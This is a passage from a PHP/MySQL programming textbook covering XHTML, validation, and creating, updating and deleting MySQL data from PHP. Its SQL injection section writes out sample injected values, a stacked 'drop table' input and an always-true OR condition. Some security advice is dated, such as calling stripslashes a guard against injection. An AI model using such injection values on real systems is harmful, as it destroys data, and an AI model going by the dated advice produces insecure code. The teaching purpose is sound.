Larger Text,Smaller Text,Symbol
Chapter 11 Questions,"Question 11-1 
  
  
 What’s the difference between
  printf( )
  and
  sprint( )
 ?
  
 Question 11-2 
  
  
 Check that the date 1/31/2045 is 
 valid.
  
 Question 11-3 
  
  
 Display the day of the week for 1/31/2045.
  
 Question 11-4 
  
  
 Rename the file
  upload.tmp
  to
  sample.jpg
 .
  
 See the “Chapter 11” section in the Appendix for the answers to these questions.
  
 250
  
 |
  
 Chapter 11: Practical PHP",NA
CHAPTER 12,NA,NA
XHTML,"12
  
 Now that you’ve learned the foundations of using PHP and MySQL to build dynamic 
 pages, take some time to explore improvements to the HTML markup that forms 
 the basis of your web pages. You’ll learn about XHTML, what it demands, and why 
 it’s worth the extra effort to produce. Remember that in order to produce quality 
 web content from your PHP scripts, the markup must be standards-conformant. 
 Think of the XHTML output as the finished product in the process of requesting a 
 page after PHP and a database functions process. We’ll also discuss validating the 
 XHTML out-put that your scripts produce to catch any errors.
  
 XHTML stands for Extensible HyperText Markup Language. XHTML is a markup 
 language that is similar to HTML, but with a stricter syntax, based on the require-
 ments of XML. HTML was built on SGML, which is flexible but complex to pro-cess, 
 and XML stripped down SGML to make it easier to process if a bit less flexible. 
 XHTML syntax looks much like HTML syntax, using greater- and less-than signs (
 < 
 and
  >
 ) to define tags, but has much stricter requirements for how those tags are 
 deployed. XHTML documents that meet those syntactic requirements are called 
 well-formed
 , while XHTML documents that meet the syntax plus the structural rules 
 contained in the DTDs are called
  valid
 .
  
  
 Plain old HTML documents can be valid, too—they don’t have to 
 meet XML’s syntactic rules, but they do have to live up to the struc-
 tures defined in the various HTML specs.
  
 XHTML documents can be processed automatically using any standard XML library, 
 while most HTML implementations use a pretty lenient parser typically customized 
 for HTML processing. You can think of XHTML as the intersection of HTML and XML 
 in many respects, since it’s a reformulation of both of them.
  
 Probably the easiest way to demonstrate what changes is to show a document in 
 HTML and its XHTML equivalent. First, here is a valid HTML 4.0 document:
  
 251",NA
Why XHTML?,"The World Wide Web Consortium (W3C) created XHTML for a number of rea-sons, 
 including the following:
  
 • Web content is delivered to more devices than conventional computers, such as 
 Blackberries, cell phones, and other mobile devices. XML’s tighter syntax 
 removes one layer of complex processing for these devices and their support 
 infrastructure to handle.
  
 • Developers working with Dynamic HTML and other scripting technologies 
 found that HTML’s flexibility sometimes meant that the document structures 
 they needed to manipulate looked a little different than expected, sometimes 
 even different from browser to browser. XHTML’s tighter structures remove 
 these ambiguities.
  
 • As more and more document management tools added XML support, XHTML’s 
 XML compatibility made it easy to use these tools on XHTML without any 
 tweaking.
  
 • On a broad scale, XHTML encourages greater consistency among documents. 
 While XML’s stricter error checking may sound like a burden, it makes it easy 
 to spot and correct errors.
  
 • While it hasn’t found much browser support, the W3C was hoping that moving 
 to an XML foundation would let developers create custom vocabularies for mix-
 ing with the classic HTML vocabulary. The W3C’s own plans included work on 
 multimedia, graphics, and forms.
  
 • XHTML could also be mixed in to other XML vocabularies, making it easier to 
  
 reuse this widely understood vocabulary in new contexts.
  
 XML’s sudden popularity drove a rethinking of why and how HTML was used, at 
 least within standards bodies. While various browsers moved to support XML and 
 XHTML to some degree, it’s far from being a required part of the web development 
 toolkit. The W3C accepted the first version of XHTML on January 26, 2000.
  
 The beauty of XML is that it requires browsers to fail when encountering 
 incorrectly created XML. What this means is that an XHTML browser can usually 
 run more eas-ily and faster on smaller devices than on a comparable HTML 
 browser. It also encourages Web authors to produce more consistent documents. 
 While stricter error checking may sound like a burden, the recommendation for 
 browsers to post an error rather than attempt to render incorrectly formed content 
 should eliminate the problem by forcing authors to correct their mistakes.
  
  
 Old-school HTML folks may be happy to hear that the W3C restarted
  
  
 the HTML Activity (as something separate from XHTML) in March
  
 2007. For more information, see
  http://www.w3.org/html/wg/
 .
  
  
 Why XHTML?
  
 | 253",NA
XHTML and XML Namespaces,"XML is incredibly generic. It defines syntax and basic structure, but it doesn’t spec-
 ify much about questions such as what elements and attributes should be named. 
 Anyone who wants to create an XML vocabulary can do so without having to con-
 tact the W3C or another standards body. This creates a problem:
  Title
  in one con-
 text may mean something entirely different than
  Title
  in a different context. The 
 Namespaces in XML specification (which can be found at
  http://www.w3.org/TR/ 
 REC-xml-names/
 ) provides a mechanism that developers can use to identify 
 particu-lar vocabularies using Uniform Resource Identifiers (URIs).
  
 URIs are a combination of the familiar Uniform Resource Locators (URLs) and Uni-
 form Resource Names (URNs). From the perspective of XML namespaces, URIs are 
 convenient because they combine an easily used syntax with a notion of ownership. 
 The W3C owns names that start with
  http://www.w3.org/
 , so it makes sense for 
 them to use those as identifiers. In plain-vanilla XHTML without any other 
 vocabularies mixed in, the namespace is declared on the
  html
  element using the 
 XHTML attribute 
 xmlns
 . For example:
  
 <html xmlns=""
 http://www.w3.org/1999/xhtml
 "" >
  
 The namespace URI
  http://www.w3.org/1999/xhtml
  now applies to the
  html
  
 element itself and to any child elements, so long as they don’t have either their own
  
 xmlns 
 attributes or names that start with a prefix and colon.",NA
XHTML Versions,"Since its inception, the XHTML standard has been constantly evolving. There are 
 three major versions in use today:
  
 XHTML 1.0 
  
 XHTML 1.0 has the same contents as HTML 4.01, but it requires the use of XML 
 syntax.
  
 XHTML 1.1 
  
 XHTML 1.1 is a module-based reformatted version of the 1.0 release. It’s strict 
 because it uses a set of modules that are selected from a much larger set defined 
 in the Modularization of XHTML. This is a W3C recommendation that provides a 
 modularization framework, modules that have a standard set and numerous 
 definitions that need to conform to the XHTML environment. Any deprecated 
 features of HTML, such as presentational elements and framesets, have been 
 removed from this version. All browser-based presentation is controlled by Cas-
 cading Style Sheets (CSS). Additionally, 1.1 adds Ruby markup support, which is 
 needed for East Asian languages.
  
 254
  
 |
  
 Chapter 12: XHTML",NA
Document Types,"An XHTML Document Type Definition (DTD) describes in precise, computer-
 readable language the syntax or grammar that is allowed for XHTML markup. When 
 an XHTML document is created, the DTD that it conforms to is declared at the top of 
 the document. XHTML 1.0 specifies three XML document types that correspond to 
 the three HTML 4.0 DTDs: Strict, Transitional, and Frameset. XHTML 1.1 and 
 XHTML 2.0 may also be specified as DTDs.
  
 Here is an example of each DTD declaration:
  
 XHTML 1.0 Strict 
  
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN""
  
  
  
  ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"">
  
 XHTML 1.0 Transitional 
  
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN""
  
  
  
  ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">
  
 XHTML 1.0 Frameset 
  
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Frameset//EN""
  
  
  
  ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd"">
  
 XHTML 1.1 
  
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN""
  
  
  
  ""http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd"">
  
 XHTML 2.0 
  
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 2.0//EN""
  
  
  
  ""http://www.w3.org/MarkUp/DTD/xhtml2.dtd"">
  
 The DTD definition is placed at the beginning of the document before the opening 
 <html>
  tag, as shown in Example 12-1.
  
 Example 12-1. A document defined as xhtml 1.0 strict
  
 <?xml version=""1.0"" encoding=""UTF-8""?> 
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN""
  
  
  ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd""> 
  
 <html xmlns=""http://www.w3.org/1999/xhtml"" xml:lang=""en"" lang=""en"">
  
  
  <head>
  
  
  
  <title>Document Type Declaration Example</title>
  
  
  </head>
  
  
  <body>
  
  
  
  <p>The content of the page goes here.</p>
  
  
  </body> 
  
 </html>
  
 The opening line:
  
 <?xml version=""1.0"" encoding=""UTF-8""?>
  
 This isn’t strictly required unless you’re using a different character encoding than 
 UTF-8.
  
 256
  
 |
  
 Chapter 12: XHTML",NA
Validation Tools,"Validating an XHTML document’s contents means checking its markup against a 
 DTD to produce a report of markup errors. You can validate HTML, XHTML, and 
 CSS files by using the W3C’s
  validator
 . (An easy way to let anyone test your docu-
 ment is to include a link to
  http://validator.w3.org/check/
 referer
  in your document.) 
 Enter the URL of your document and click Validate. For
  http://www.krautgrrl.com
 , 
 the code in Example 12-2 shows what was returned.
  
 Example 12-2. Adding a validation link as validate.html
  
 <?xml version=""1.0"" encoding=""UTF-8""?> 
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN""
  
  
  ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd""> 
  
 <html xmlns=""http://www.w3.org/1999/xhtml"" xml:lang=""en"" lang=""en"">
  
  
  <head>
  
  
  
  <title>Document Type Declaration Example</title>
  
  
  </head>
  
  
  <body>
  
  
  
  <p>The content of the page goes here.
  
  
  
  <a href=""http://validator.w3.org/check/referer"">Validate</a> </p>
  
  
 </body> 
  
 </html>
  
 Example 12-2 displays in a web browser, as shown in Figure 12-1.
  
  
 Figure 12-1. The page with the new Validate line
  
 Clicking on Validate causes the page to be validated, as shown in Figure 12-2.
  
 Example 12-3 introduces a couple of errors to test whether the
  validator
  will catch 
 them.
  
 Example 12-3. Adding a couple of errors to validate_error.html
  
 <?xml version=""1.0"" encoding=""UTF-8""?> 
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN""
  
  
  ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd""> 
  
 <html xmlns=""http://www.w3.org/1999/xhtml"" xml:lang=""en"" lang=""en"">
  
  
  <head>
  
  
  
  <title>Document Type Declaration Example</title>
  
  
  </head>
  
 XHTML Versions
  
 | 257",NA
Common Validation Gotchas,"The following rules are the most common pitfalls to watch out for when creating 
 your XHTML code:
  
 Not closing elements that didn’t require a closing tag in HTML4 
  
 For example, using
  <br>
  instead of the correct
  <br />
  is not compliant. While 
 <br/>
 ,
  <br />
 , and
  <br></br>
  are also acceptable for XTHML, they are not as 
 compatible with older browsers as
  <br />
 .
  
 258
  
 |
  
 Chapter 12: XHTML",NA
Generating XHTML with PHP,"Generating XHTML from your PHP code is no more difficult than creating plain old 
 HTML (see Example 12-4).
  
 Example 12-4. Creating an XHTML document from PHP
  
 <?php 
  
 //Ask the browser if it knows about the application/xthml+xml MIME type 
  
 //This is necesary because of IE 
  
 if(stristr($_SERVER[""HTTP_ACCEPT""],""application/xhtml+xml"")) {
  
  
  header('Content-Type: application/xhtml+xml; charset=utf-8'); 
  
 } 
  
 else {
  
  
  header('Content-Type: text/html; charset=utf-8'); 
  
 }
  
 //Create the document type 
  
 $doctype  = '<?xml version=""1.0"" encoding=""UTF-8""?>'; 
  
 $doctype .= '<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN"" '; 
  
 $doctype .= '    ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd""> ';
  
 //Create the heading 
  
 $head=      '<html xmlns=""http://www.w3.org/1999/xhtml"" xml:lang=""en"" lang=""en"">'; $head    .= 
 '    <head>'; 
  
 $head    .= '        <title>Document Type Declaration Example</title>'; 
  
 $head    .= '    </head>';
  
 //Create the body text 
  
 $body     = '    <body>'; 
  
 $body    .= '         <p>The content of the page goes here.</p>'; 
  
 $body    .= '    </body>';
  
 //Create the footer text 
  
 $footer   = '</html>';
  
 //Display it all together 
  
 echo $doctype; 
  
 echo $head; 
  
 echo $body; 
  
 echo $footer; 
  
 ?>
  
 Generating XHTML with PHP
  
 | 261",NA
Chapter 12 Questions,"Question 12-1 
  
  
 What are the acceptable ways to include a break in XHTML?
  
 Question 12-2 
  
 What’s the difference between specifying the document type
  <!doctype
  doctype_ 
 url
 >
  and the MIME type using
  header( )
 ?
  
 Question 12-3 
  
  
 Why can’t a MIME type of
  application/xhtml+xml
  always be specified?
  
 Question 12-4 
  
  
 How is XHTML output different than HTML output in PHP?
  
 See the “Chapter 12” section in the Appendix for the answers to these questions.
  
 262
  
 |
  
 Chapter 12: XHTML",NA
CHAPTER 13,NA,NA
Modifying MySQL Objects and PHP Data,"13
  
 In Chapter 12 you learned about the advantages of XHTML over traditional HTML. 
 This chapter explores using all of the concepts you’ve learned together so far to 
 per-form more complicated database tasks with PHP. You’ll learn how to create and 
 modify both MySQL data and database objects from within PHP. We’ll go over 
 dynamically creating HTML hyperlinks to allow your end user to expand or modify 
 data from a database query. In fact, after you learn about sessions in the next chap-
 ter, you’ll have everything you need to create full-fledged applications.",NA
Changing Database Objects from PHP,"The SQL query string remains the common tool for giving database commands. You 
 can just as easily create and modify database objects with standard SQL that is 
 called the same way you execute queries. Sometimes you’ll want to create database 
 objects from within PHP. We’ll begin with creating a table, which is an example of 
 creating objects.",NA
Creating a Table,"We’ve previously created the
  books
  and
  authors
  tables, but we haven’t created the 
 purchases
  table. We’ll create one using the PHP shown in Example 13-1.
  
 Example 13-1. Creating a table from a PHP page in create_table.php
  
 <?php 
  
 include('db_login.php'); 
  
 require_once( 'DB.php' );
  
  
  $connection = DB::connect( ""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (!$connection) 
  
 {
  
  
  die (""Could not connect to the database: <br>"". DB::errorMessage( )); 
  
 }; 
  
 $query = 'CREATE TABLE purchases (
  
  
  
  purchase_id int(11) NOT NULL auto_increment,
  
 263",NA
Dropping a Table,"Example 13-2 drops the table you just created.
  
 Example 13-2. Dropping the purchases table in drop.php
  
 <?php 
  
 require_once('db_login.php'); 
  
 require_once('DB.php'); 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection)); } 
  
 $query = ""
 DROP TABLE purchases
 ""; 
  
 $result = $connection->query($query); 
  
 if (DB::isError($result)){
  
  
  die(""Could not query the database: <br />"". $query."" "".DB::errorMessage($result)); } 
  
 echo ""Table dropped successfully!""; 
  
 $connection->disconnect( ); 
  
 ?>
  
 Example 13-2 returns the following:
  
 Table dropped successfully!
  
 That worked great, but you’re going to need the
  purchases
  table, so let’s recreate the 
 table by calling the
  create_table.php
  code in Example 13-1. Since you’re modifying 
 objects, there’s a possibility that the database won’t let you do what you ask it to 
 do, which is where errors can occur.
  
  
 Dropping tables risks data loss. Be very careful about using
  DROP
 !",NA
Errors Happen,"To make sure you handle an error properly—such as a typo in the
  CREATE
  
 statement or, in this case, trying to create a table that already exists—execute the
  
 create_table. php
  script again. This produces the error shown in Figure 13-2.
  
 Assuming that your object was created without an error, you’re going to want to 
 manipulate and add data to it from PHP. Therefore, next you’ll add data to an exist-
 ing table based on input from the user.
  
 Changing Database Objects from PHP
  
 | 265",NA
Manipulating Table Data,"Since you’ve practiced executing a few SQL commands that manipulate database 
 objects, you’re ready to work with the data in your tables. You’re going to be using 
 the same SQL commands as when you created them from the MySQL prompt, but 
 now we’re going to integrate user data within PHP.",NA
Adding Data,"Naturally, you’ll need to add rows to your tables because you’re inserting new 
 infor-mation. To add a purchase to your new
  purchases
  table, you’ll use an
  INSERT
  
 state-ment in your query. Example 13-3 shows how this is done. Go ahead and run 
 Example 13-1 again so you have a table in which to insert the data.
  
 Example 13-3. Using a predefined INSERT statement in insert.php
  
 <?php 
  
 require_once('db_login.php'); 
  
 require_once('DB.php'); 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection)); } 
  
 $query = ""
 INSERT INTO purchases VALUES (NULL,'mdavis',2,NULL)
 ""; 
  
 $result = $connection->query($query); 
  
 if (DB::isError($result)){
  
  
  die(""Could not query the database: <br />"". $query."" "".DB::errorMessage($result)); } 
  
 echo ""Inserted successfully!""; 
  
 $connection->disconnect( ); 
  
 ?>
  
 When you call up
  insert.php
  in your browser, you get the following:
  
 Inserted successfully!
  
 Figure 13-3 shows that the new row made it into the database by selecting all rows 
 from
  purchases
 .
  
 266
  
 |
  
 Chapter 13: Modifying MySQL Objects and PHP Data",NA
Displaying Results with Embedded Links,"You may want to give your web user the ability to click a hyperlink to launch an 
 action that relates to the current row in the results from a query. You do this by 
 add-ing URL links to the results of a query when they display on the screen. The 
 links contain a unique identifier to the row and the script that handles the action.
  
 The PHP script that’s the target of the link typically queries the database based on 
 the unique identifier that was passed to it. The types of action you can do range 
 from formatting or deleting a row to expanding on details from a related table, such 
 as authors for book titles.
  
 In Example 13-4, let’s display the list of titles with hyperlinks to purchase the titles.
  
 Example 13-4. Using embedded links to provide a purchase button in 
  
 pear_purchase_example.php
  
 <?php 
  
 require_once('db_login.php'); 
  
 require_once('DB.php'); 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection)); } 
  
 $query = ""SELECT * FROM books""; 
  
 $result = $connection->query($query); 
  
 if (DB::isError($result)){
  
  
  die(""Could not query the database: <br />"". $query."" "".DB::errorMessage($result)); } 
  
 echo '<table border=""1"">'; 
  
 echo ""<tr><th>Title</th><th>Pages</th><th>Buy</th></tr>""; 
  
 while ($result_row = $result->fetchRow(DB_FETCHMODE_ASSOC)) {
  
  
  echo ""<tr><td>"";
  
  
  echo $result_row[""title""] . '</td><td>';
  
  
  echo $result_row[""pages""] . '</td><td>';
  
  
  echo '<a href=""purchase.php?title_id='.$result_row[""title_id""].'"">Click 
  
 to purchase</a></td></tr>'; 
  
 }
  
 Displaying Results with Embedded Links
  
 | 267",NA
Presenting a Form to Add and Process in One File,"We’re building a form that allows a web user to add a title to the
  books
  table. 
 Example 13-6 is a slightly longer example because we display and process the form 
 in one file, but it should look familiar to you since we’re simply combining several 
 steps that we’ve done separately before.
  
 Example 13-6. Using input from a form to add a title
  
 <?php 
  
 // Define a function to perform the database insert and display the titles function 
 insert_db($title, $pages){
  
  
  require_once('db_login.php');
  
  
  require_once('DB.php');
  
  
  $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database"");
  
  if 
 (DB::isError($connection)){
  
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection));
  
  }
  
  if (get_magic_quotes_gpc( )) {  //guard against SQL injection
  
  
  $title = stripslashes($title);
  
  
  $pages = stripslashes($pages);
  
  }
  
 270
  
 |
  
 Chapter 13: Modifying MySQL Objects and PHP Data",NA
SQL Injection,"You must take several precautions when working with strings submitted from a 
 form that will be processed by the database. Specifically, you need to be on guard 
 for a tactic called
  SQL injection
 . SQL injection is when a malicious user enters 
 another SQL query into a field such as:
  
  1,1);drop table users;
  
 If that field is added to this query:
  
 $query = ""INSERT INTO books VALUES (NULL,$title,$pages)"";
  
 here’s what could happen:
  
 INSERT INTO books VALUES (NULL,1,1);drop table users; ,$pages)"";
  
 PHP and MySQL work together to thwart this kind of attack. What happens is the 
 MySQL query command allows only one statement per query. So, attempting to 
 start a new query after the first one has already been started generates an error.
  
 Here’s another type of attack:
  
 $query = ""DELETE FROM books where title_id = '$title_id'"";
  
 If the user specifies a malicious value of
  ""'1 OR ''1''=''1'""
  for
  $title_id
 , here’s what could 
 happen:
  
 DELETE FROM books where title_id = 1 OR '1'='1'
  
 This deletes all books instead of one.
  
 PHP uses a system by default called
  magic quotes
  with user input. Magic quotes 
 auto-matically escape any special characters with a backslash (
 \
 ), including single 
 and double quotes. Unfortunately, magic quotes don’t provide enough protection to 
 be safe. Example 13-7 shows how to test whether magic quotes are enabled on your 
 installation of PHP.
  
 Example 13-7. Checking for magic quotes
  
 <?php 
  
 if (get_magic_quotes_gpc( )) {
  
  
  echo ""Magic quotes are enabled.""; 
  
 } else {
  
  
  echo ""Magic quotes are disabled.""; 
  
 }
  
  
  ?>
  
 The script should return the following:
  
 Magic quotes are enabled.
  
 However, it’s better to use the MySQL-specific escape function, which is
  mysql_real_ 
 escape_string( )
 , as shown in Example 13-8.
  
 Presenting a Form to Add and Process in One File
  
 | 273",NA
Cross-Site Scripting Attacks,"Another major gotcha to look out for when using data from user input is the risk of 
 cross-site scripting attacks
 . These attacks work slightly differently from SQL injec-
 tion. They don’t compromise the data on your server, but instead can lead to a 
 user’s browser giving out sensitive data to a third party because the browser thinks 
 the command came from your trusted site. To guard against these attacks, you 
 should pass any strings that came from a user through the
  htmlentities
  function. It 
 takes the format of:
  
 htmlentities(
 string_to_clean
 )
  
 For example:
  
 print ""The title of the book is: "" . htmlentities($_POST['title']);
  
 Here’s an example of what
  htmlentities
  does to the string:
  
 <?php 
  
 $sample = ""A sample is <i>italics</i>""; 
  
 echo htmlentities($sample); 
  
 ?>
  
 When executed, this returns the HTML markup, as seen from the View Source option 
 of your web browser:
  
 A sample is &lt;i&gt;italics&lt;/i&gt;
  
 The browser displays this as:
  
 A sample is <I>italics</I>
  
 274
  
 |
  
 Chapter 13: Modifying MySQL Objects and PHP Data",NA
Updating Data,"Since you’ve been inputting table data, you can also change existing records. You’ll 
 probably do this only if there are errors in your data, or in the instance that user 
 data has changed and needs to be updated in the database. Updates are handled as 
 shown in Example 13-9.
  
 Example 13-9. Updating a field
  
 <?php 
  
 require_once('db_login.php'); 
  
 require_once('DB.php'); 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection)); } 
  
 $query = ""UPDATE books SET pages=558 WHERE title_id=2""; 
  
 $result = $connection->query($query); 
  
 if (DB::isError($result)){
  
  
  die(""Could not query the database: <br />"".$query."" "".DB::errorMessage($result)); } 
  
 echo ""Updated successfully!""; 
  
 $connection->disconnect( ); 
  
 ?>
  
 If you have multiple columns to edit in one record at a single time, you’d separate 
 the code with a comma (
 ,
 ). Again, you could’ve used a dynamic value such as a form 
 input in the
  WHERE
  clause. If you use a
  WHERE
  clause, you’d have to specify which 
 rows the update affects; otherwise, the change applies to every row.
  
 Updates and deletions are two of most important reasons to use a primary key. The 
 primary key number, which never should change, can be a point of reference in the 
 WHERE
  clause. In Figure 13-9, you see the new value in the
  books
  table from the
  
 mysql 
 client.
  
 As a precaution against accidentally updating too many rows, apply a
  limit
  clause 
 with your update. Next, we’ll discuss how to intentionally delete data.
  
  
  
 Never update a primary key column. This value should never 
 change. If you change a primary key in one table, it could affect the 
 data in another table.
  
 27
 6
  
 |
  
 Chapter 13: Modifying MySQL Objects and PHP Data",NA
Deleting Data,"Use the
  DELETE
  command to completely remove existing data from the database. 
 Remember, though, that once you’ve deleted data, it can no longer be retrieved; it’s 
 permanently gone. Make sure you have appropriate checks and balances in place 
 for the deletion of existing data. Use the
  WHERE
  command so that you don’t delete 
 data from all the rows in your table.
  
 The command
  TRUNCATE TABLE
  tablename
  deletes an entire table, which means the 
 table structure and the records, and then it recreates the structure. Technically, 
 your final result is the same, but our example is a safer way to perform a delete. The 
 advantage of
  TRUNCATE
  is that it’s much faster for deleting large tables.
  
  
 While it’s great to be able to
  DROP
  and
  TRUNCATE
  tables from PHP, 
 you probably don’t want to leave this capability anywhere on your 
 web site for an average user.
  
 There is a way to safeguard against erroneous selections by running the query 
 using 
 SELECT
  instead of
  DELETE
  with the same
  WHERE
  clause. Deleting data from a 
 MySQL database through PHP works similarly to any of the other queries. If you do 
 this, query results display which row or rows are going to be affected by your 
 deletion. Let’s modify the example to provide a link that deletes the current row. In 
 Example 13-10, you’ll delete a purchase.
  
 Example 13-10. Providing a link to delete a purchase in deletion_link.php
  
 <?php 
  
 require_once('db_login.php'); 
  
 require_once('DB.php'); 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection)); }
  
 Deleting Data
  
 | 277",NA
Generating Unique Identifiers,"In our examples so far, we always let MySQL pick the primary key when doing 
 inserts by sending
  NULL
  in the
  key
  field. The downside of this is that you don’t know 
 which key value MySQL assigned your row. If you add a book and then an author, 
 how do you know what the foreign key value is for the book to add in the
  authors 
 table? Well, you can use the
  mysql_insert_id( )
  command to get the last auto-assigned 
 primary key from an
  AUTO_INCREMENT
  column.
  
 Its syntax is:
  
 int mysql_insert_id( [resource link_identifier] )
  
 If the last query generated an auto-increment, that value is returned. Zero is 
 returned if the last query didn’t generate a key.
  FALSE
  is returned if there isn’t a 
 valid database connection.
  
 Execute
  mysql_insert_id( )
  directly after the
  INSERT
  statement to minimize the possi-
 bility of another
  INSERT
  statement being executed before you read the value. In a 
 multitasking environment, you have to be aware that other processes or users may 
 also be using the data to execute queries. Figure 13-12 shows the output of the PHP 
 code. For example, to grade the last index key used:
  
 mysql_query($query); 
  
 $last_value = mysql_insert_id( ); 
  
 echo ""The id that was created is: $last_value<br />"";
  
 PEAR DB uses its own sequence mechanism to generate unique IDs. Given an active 
 database connection, the
  nextId( )
  function returns the insertion key to use. The 
 MySQL
  mysql_insert_id( )
  function retrieves the key value after the insert, while the 
 PEAR DB
  nextId( )
  function generates a value that’s used in the insert statement.
  
 280
  
 |
  
 Chapter 13: Modifying MySQL Objects and PHP Data",NA
Performing a Subquery,"Sometimes you’ll want to display the data in a linked table as a list instead of 
 repeat-ing all of the values from the joined table. For example, when listing books, it 
 would look nicer to list authors in one cell of your table. Example 13-13 uses a 
 second query and a loop to accomplish this.
  
 Example 13-13. Displaying the authors in a list
  
 <?php 
  
 require_once('db_login.php'); 
  
 require_once('DB.php'); 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection)); } 
  
 // Display the table 
  
 $query = ""SELECT * FROM books""; 
  
 $result = $connection->query($query); 
  
 if (DB::isError($result)){
  
  
  die(""Could not query the database: <br />"".$query."" "".DB::errorMessage($result)); } 
  
 echo '<table border=""1"">'; 
  
 echo ""<tr><th>Title</th><th>Pages</th><th>Authors</th></tr>"";
  
 282
  
 |
  
 Chapter 13: Modifying MySQL Objects and PHP Data",NA
Chapter 13 Questions,"Question 13-1 
  
 Add another column to the
  books
  table called
  published_date
  that stores a date in 
 a PHP page.
  
 Question 13-2 
  
 What are the two major categories of security risks when working with user 
 input?
  
 Question 13-3 
  
 Which function tells you whether the PHP interpreter has magic quotes turned 
 on?
  
 Question 13-4 
  
 Which function prevents cross-site scripting attacks when used before display-
 ing user-supplied input?
  
 See the “Chapter 13” section in the Appendix for the answers to these questions.
  
 284
  
 |
  
 Chapter 13: Modifying MySQL Objects and PHP Data",NA
CHAPTER 14,NA,NA
"Cookies, Sessions, and Access Control","14
  
 As your applications grow more complex, you’ll need to keep better track of your 
 users. Cookies, sessions, and access control all provide an opportunity to interact 
 appropriately with specific users. Sessions allow for the persistence of data in an 
 oth-erwise stateless interaction. Without sessions, the web server sees each page 
 request without the context of other page requests and therefore cannot remember 
 data between requests.",NA
